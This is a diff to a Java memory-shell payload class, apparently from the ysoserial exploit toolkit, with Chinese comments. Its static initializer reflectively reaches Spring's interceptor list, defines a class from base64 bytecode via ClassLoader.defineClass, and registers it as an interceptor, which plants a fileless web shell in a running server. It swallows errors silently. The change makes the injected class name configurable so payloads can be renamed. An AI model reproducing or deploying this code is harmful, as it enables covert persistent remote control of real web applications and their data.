@@ -16,6 +16,7 @@ import java.lang.reflect.Method;
 
 public class SpringInterceptorMemShell extends AbstractTranslet {
     static String b64;
+    static String clazzName;
 
     static {
         try {
@@ -45,15 +46,14 @@ public class SpringInterceptorMemShell extends AbstractTranslet {
             field.setAccessible(true);
             java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);
 
-            String className = "ysoserial.payloads.templates.SpringInterceptorTemplate";
             //加载ysoserial.payloads.templates.SpringInterceptorTemplate类的字节码
             byte[] bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
             java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
             java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
             m0.setAccessible(true);
-            m0.invoke(classLoader, className, bytes, 0, bytes.length);
+            m0.invoke(classLoader, clazzName, bytes, 0, bytes.length);
             //添加SpringInterceptorTemplate类到adaptedInterceptors
-            adaptedInterceptors.add(classLoader.loadClass(className).newInstance());
+            adaptedInterceptors.add(classLoader.loadClass(clazzName).newInstance());
         } catch (Exception e) {
 //            e.printStackTrace();
         }
